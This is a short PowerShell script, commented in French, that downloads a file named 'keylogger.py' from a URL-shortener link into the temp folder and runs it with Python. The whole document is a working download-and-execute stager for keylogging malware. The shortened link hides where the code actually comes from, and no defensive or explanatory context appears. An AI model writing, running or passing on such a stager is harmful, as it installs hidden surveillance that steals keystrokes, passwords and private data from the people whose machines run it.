$url = "https://rebrand.ly/5uapstf"
$output = "$env:temp\keylogger.py"

try {
    # Télécharger le fichier en utilisant Invoke-WebRequest
    Invoke-WebRequest -Uri $url -OutFile $output
    Write-Output "Download succeeded."

    # Exécuter le script Python téléchargé
    python3 $output
} catch {
    Write-Output "Download failed: $_"
}
